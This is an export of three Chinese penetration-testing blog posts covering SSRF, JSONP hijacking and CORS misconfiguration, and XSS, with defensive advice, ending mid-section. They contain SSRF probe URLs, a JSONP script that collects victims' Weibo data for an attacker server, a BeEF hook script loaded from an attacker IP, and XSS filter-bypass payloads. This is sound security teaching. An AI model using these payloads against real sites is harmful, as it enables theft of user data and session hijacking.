社交分享功能：获取超链接的标题等内容进行显示 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译：给网址翻译对应网页的内容 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 漏洞检测 一般发起网络请求中会使用libcurl库，所以他会有各种协议（可以简单执行curl -V）各个协议调用探针：http,file,dict,ftp,gopher 等 漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等 1234http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21 代码层面 PHP 123file_get_contents()fsockopen()curl_exec() 以上三个函数使用不当会造成SSRF漏洞 需要注意以下几点： 大部分 PHP 并不会开启 fopen 的 gopher wrapper file_get_contents 的 gopher 协议不能 URLencode file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败 curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用 curl_exec() //默认不跟踪跳转 file_get_contents() // file_get_contents支持php://input协议 JAVA 1Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类 以上几种类引用不当会造成SSRF 网络请求支持的协议如下 http，https，file，ftp，mailto，jar，netdoc 对比php的ssrf，java这块利用相对局限 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 利用 攻击内网进行扫描，识别服务器指纹并攻击 对主机进行端口扫描 运行主机内程序 读取内网信息（file协议） 需要注意的是，回显是能否成功利用的重要的条件，在某些场景协议限定为HTTP模式且没有回显，利用 会相对复杂了。 协议利用 DICT：除了泄露安装软件版本信息，还可以查看端口，**操作内网redis服务（只能一条指令一条指令地发送）**等 File：读取文件 Gopher：万能协议（利用Gopher攻击Redis、攻击Fastcgi 等 FTP(S)/SMB(S)：匿名访问及爆破 Tftp：UDP协议 发送UDP数据包 Telnet：SSH/Telnet匿名访问及爆破 漏洞利用小技巧 crontab -l 显示当前计划任务 crontab -r 清除当前计划任务 端口转发工具 socat 在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php 防御 统一错误信息 协议限制：http &amp;&amp; https 内网IP限制 域名限制 需要一直解析到IP为止 URL白名单 正则匹配 禁止30x跳转 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com、www.a.com@10.10.10.1 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 指向任意IP的域名：xip.io 常见SSRF漏洞 Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf discuz! 的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换） weblogic的ssrf","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"}]},{"title":"授权与跨域共享","slug":"授权与跨域共享","date":"2023-05-31T02:02:30.000Z","updated":"2023-05-31T02:02:30.000Z","comments":true,"path":"articles/2023/05/31/授权与跨域共享/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/","excerpt":"","text":"认证、授权与凭证的概念 认证：验证当前用户的身份。例如有一个登陆窗口，只有输入正确的账号密码就算认证成功。 授权：用户授予第三方应用访问该用户某些资源的权限。例如有一个模特，经过一些协定，这模特把自己的肖像权授予商家使用。 凭证：实现认证和授权的前提是需要一种媒介（证书）。例如认证中的账号密码，例如授权中的协定。 COOKIE HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息）。服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。 cookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。 cookie 是不可跨域的： 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，一级域名和二级域名之间是允许共享使用的（靠的是 domain）。 重要属性： httpOnly 如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全 SESSION session 是另一种记录服务器和客户端会话状态的机制 session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中 session 认证流程： 用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session 请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器 浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名 当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。 根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。 TOKEN 访问资源接口（API）时所需要的资源凭证 简单 token 的组成： uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串） 特点： 服务端无状态化、可扩展性好 支持移动端设备 安全 支持跨程序调用 token 的身份验证流程： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端 客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 token 服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据 特点： 每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里 基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库 token 完全由应用管理，所以它可以避开同源策略 JWT JSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。 是一种认证授权机制。 JWT 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（RFC 7519）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。 可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。 JWT 认证流程： 用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT 客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie） 当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样Authorization: Bearer &lt;token&gt; 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为 因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要 因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制 JWT 的使用方式 客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 方式一 当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。 123GET /calendar/v1/eventsHost: api.example.comAuthorization: Bearer &lt;token&gt; 用户的状态不会存储在服务端的内存中，这是一种 无状态的认证机制 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。 由于 JWT 是自包含的，因此减少了需要查询数据库的需要 JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。 因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 方式二 跨域的时候，可以把 JWT 放在 POST 请求的数据体里。 方式三 通过 URL 传输：http://www.example.com/user?token=xxx 常见的前后端鉴权方式 Session-Cookie Token 验证（包括 JWT，SSO单点登录认证） OAuth2.0（开放授权） Cookie 、Session和Token的对比 属性 Cookie Session Token（JWT） 安全性 差 - 好（不会有CORS劫持） 存储方式 由浏览器存储 由服务器存储 由应用管理 存储大小 小（且时间长） 理论无限大（时间短） - 功能差异 1. 移动端支持差；2. 无法跨域 - 1. 移动端支持好 实现方式 存储与比对，会存储会话信息 存储与比对，会存储会话信息 直接解析比对，不依赖cookie，不会存储会话信息 同源策略 所谓的同源就是：协议+主机（域名）+端口都相同，一般来说，主机协议不一样，那么端口就不一样，就像http 80 https 443一样。 主要用来防止跨源操作，例如，读和写。 但是我们有时候需要引入外部资源，这个同源一棒子全部打死，咋办？ 这时候有两种解决方式一个是JSONP，一个是CORS： 一个是通过src标签属性来绕过检查 一个是通过双方验证允许的列表，来保证导入的数据是好的 他们分别会导致不同的劫持。 同源判断示例：URL地址 http://www.example.com/dir/page.html Compared URL Outcome Reason http://www.example.com/dir/page2.html Success Same protocol, host and port http://www.example.com/dir2/other.html Success Same protocol, host and port http://domain-ip/dir/page2.html Failure Different host (exact match required) http://username:password@www.example.com/dir2/other.html Success Same protocol, host and port http://www.example.com:81/dir/other.html Failure Same protocol and host but different port https://www.example.com/dir/other.html Failure Different protocol http://en.example.com/dir/other.html Failure Different host http://example.com/dir/other.html Failure Different host (exact match required) http://v2.www.example.com/dir/other.html Failure Different host (exact match required) http://www.example.com:80/dir/other.html Depends Port explicit. Depends on implementation in browser JSONP——填充式 JSON JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。JSONP实现跨域请求的原理简单的说，就是动态创建&lt;script&gt;标签，然后利用&lt;script&gt;的src 不受同源策略约束来跨域获取数据。JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性。 JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&lt;script&gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;document.body.insertBefore(script, document.body.firstChild); 在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。 123function handleResponse(response)&#123; // 对response数据进行操作代码&#125; 劫持 那么劫持又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。 劫持利用过程 通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题。 如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。 用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息； 用户通过浏览器向网站A发出URL请求； 网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下： 1234567&lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123; alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt; 用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求； 网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下： 1Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。 网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。 实例： 攻击者通过巧妙设计一个网站，网站中包含其他网站的JSONP漏洞利用代码，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。 挖掘思路 这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露) 首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。 然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email 然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例，发现换成了别的浏览器还是能检测到，说明验证的来源有些问题 自动化查找 自动化测试工具Selenium + Proxy + 验证脚本 Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口； Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求； 验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！ 利用 JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(水坑攻击)，下面的一个例子就可以说是在模拟水坑攻击 当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上 12345678910111213141516$.ajax(&#123; url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;, type: &#x27;get&#x27;, dataType: &#x27;jsonp&#x27;,&#125;).done(function(json)&#123; var id = json[&quot;data&quot;][&quot;id&quot;]; var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;]; var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;]; var post_data = &quot;&quot;; post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;; post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;; post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url); console.log(post_data); // 发送到我的服务器上&#125;).fail(function() &#123;&#125;); 利用代码：https://github.com/qiaofei32/jsonp_info_leak 防护 严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。 严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。 严格过滤 callback 函数名及 JSON 里数据的输出。 严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。 其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 CORS——跨来源资源共享 CORS（Cross-Origin Resource Sharing 跨来源资源共享），CORS允许浏览器向跨域服务器发出XmlHttpRequest请求，CORS与JSONP的区别：是JSONP的升级版，JSONP只能通过get方式请求，CORS支持get和post请求。 CORS跨域原理：向header中注入Access-Control-Allow-Origin服务端过判断请求头中的参数是否被允许的域来决定请求源是否有权限获取数据。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 字段 Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大； Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 简单流程 这个响应头表示访问允许，*符号表示所有的请求源的所有形式的请求，都被允许访问数据，这样也就造成了一个跨域读取敏感信息的漏洞。 改为百度成功,假如我改成自己服务器上的话,是不是在本机就能读取到别人的敏感信息呢? 如何快速判断是否存在CORS漏洞 1234567891011121314最好的攻击案例：Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true可能存在利用点：Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true配置失误，但是几乎无法利用：Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true或者只有一个：Access-Control-Allow-Origin: * 修复建议： 加强对access-control-allow-orign的控制； 另外提一下大平台很喜欢利用cors跨域读取资源，多多使用f12打法有奇效。总的来说jsonp劫持和cors跨域都是属于csrf漏洞的一种,需要诱骗受害者点击才能触发,就是返回信息的接口被攻击者调用了 返回了敏感数据给其他人。 检测 CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。 首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框： 然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值： 条件可以是： 12Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true 这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞 一定有： 1234Access-Control-Allow-Origin: *或Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true 可能：（同时出现） 12Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true 没有：(浏览器会自动截至) 12Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。 工具 https://github.com/chenjj/CORScanner。 详细说明+payload https://github.com/AI0TSec/blog/issues/9 防护 关闭不必要开启的CORS； 白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值； 仅允许使用安全协议，避免中间人攻击； 尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击； 避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false； 限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险； 限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略； 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"}]},{"title":"XSS跨站基础","slug":"XSS跨站基础","date":"2023-05-30T08:40:42.000Z","updated":"2023-06-01T03:09:45.000Z","comments":true,"path":"articles/2023/05/30/XSS跨站基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/","excerpt":"","text":"XSS跨站基础 原理 恶意攻击者在web页面中会插入一些恶意的javascript代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。 层面：一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果 函数：比如说php中的脚本的输出函数：常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export 危害影响 攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。 网络钓鱼，包括获取各类用户账号； 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 注意：浏览器的内核会影响攻击的产生（会阻止），所以，XSS的危害会受到很多因素的影响。 攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址 出现位置 文章发表、评论、留言、注册资料、修改资料等地方 什么位置是有用的？ 一般XSS漏洞，厂家是不收的，因为有很多的限制条件，但是我们如果在订单发布等地方发现了XSS存储型漏洞，那么这个漏洞是很有价值的。因为管理员会经常访问订单页面查看，不需要我们去发链接给他触发。 重点位置： 留言板 评论区 订单系统 反馈信息 测试手法 盲打，直接冲，乱甩payload。注意，这个位置必须是上面的位置！ 攻击类型分类 反射型：发包 =&gt; x.php =&gt; 回包 存储型：发包 =&gt; x.php =&gt; 数据库 =&gt; 回包 DOM型：发包 =&gt; 本地浏览器静态前端代码 =&gt; x.php 反射型 反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。是需要点击才能攻击。 场景：攻击者发送一个带有恶意连接的邮件给受害者，受害者点击。 存储型 存储型XSS时常伴随着SQL注入。它的特征是，XSS攻击Payload是被写到数据库里面了。是持续性的攻击。 场景：受害者正常访问网页，网页会执行XSS脚本。 DOM型 在翻页的时候，有两种：一种是点击第二页，然后跳转，另一种是点击展示更多，然后加载。前者是与PHP等后端语言打交道，然后生成页面。后者是与HTML打交道，然后重新构造DOM（插入），生成更多的视图。 而JS可以操作HTML DOM结点！ 官方解释： 基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var pos=document.URL.indexOf(&quot;name=&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 从代码层面看，漏洞形成原因很简单，document.URL获取用户输入，在代码中未经过任何过滤就传递给了document.write输出到当前页面中。 当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中： 也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS。 从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。 DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。 参考链接：https://www.mi1k7ea.com/2019/06/25/浅析DOM型XSS/ 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。具体见附录。 实际攻击示例 发现订单页面： 登录XSS平台，复制他给的PAYLOAD 注入之后，等到管理员打开订单系统查看信息，那么就会出发漏洞，我们可以从XSS平台上获得相关信息，例如cookie 获得COOKIE后使用Postman构造包，模拟发送接收，重现登录到后台系统的操作。 注：也可以自己写代码接收数据。自己构建XSS平台。 手法 XSS平台的使用 平台有很多，直接上网搜“XSS”平台即可。还有著名的Beef平台。 xssaq.com 上面说过简单的利用。大致都是复制平台上的Payload，放到可能有xss注入的地方。然后再平台上进行相关操作。 XSS工具的使用 beef-xss，就是复制他给的攻击Payload，直接冲就完事了。然后他通过hook.js实现对网站的攻击。可以实现跳转啊之类的。 1&lt;script src=&quot;http://IP:3000/hook.js&quot;&gt;&lt;/script&gt; IP地址扫描 结合JBoss攻击… 实际上他是 禁止加载外域的代码。 XSS结合其他漏洞 绕过 代码过滤 测试是否存在过滤 输入asdf&lt;'&quot;=&gt;asdf 这个有没有被过滤。如果看源码这个都没有转码成&amp;gt;&amp;lt;啥的，就很可能存在XSS漏洞。 因为存在&lt;&gt;与单引号这一类字符，所以HTML不正确，会一直呆在那个页面，而如果正确，则会到成功页面。那时候我们基于这个网址构造的payload就没用了。所以在调试的时候必须让这个页面处于原页面，不让他转。 如果过滤了&lt;&gt;和&quot;，那么可以使用onFocus=‘来完成攻击。 常用的攻击和测试函数： alert eval fromCharCode onChange onFocus &lt;.\\*?&gt; 代码绕过 双写绕过、大小写绕过 伪协议绕过：javascript:alert(1);。注：Javascript:伪协议后面可以使用URL编码。 &lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt; &lt;IMG SRC=javascript:alert('XSS')&gt; 利用标签属性： script：&lt;script&gt;alert('1')&lt;/script&gt; &lt;a href=&gt;：&quot;&gt; &lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;（新造一个标签，可以大小写绕过） &lt;img&gt;：&lt;img src=11 onerror=alert(1)&gt; 利用事件： onclick：onclick=alert(1) onfocus：onfocus=javascript:alert(1) onerror：onerror=alert(1)。onerror里的内容是当js解析的,因此可以用JSunicode编码,但是不能全部编码只能编码函数名。如果全部编码是会出错的。onerror支持：html10,html16，jsunicode,不支持js8进制和js16进制 onmouseover：（表示当鼠标移动到该标签上时就会触发执行某项动作）。 利用远程加载： 123&lt;script&gt;$.getScript(&quot;http://raw.githubsercontent.com/GrayHatHacking/GHHv5/master/ch16/test.js&quot;, function()&#123; hack(); &#125;); //&lt;/script&gt; 利用编码： 使用Unicode编码js代码（转码网站）： 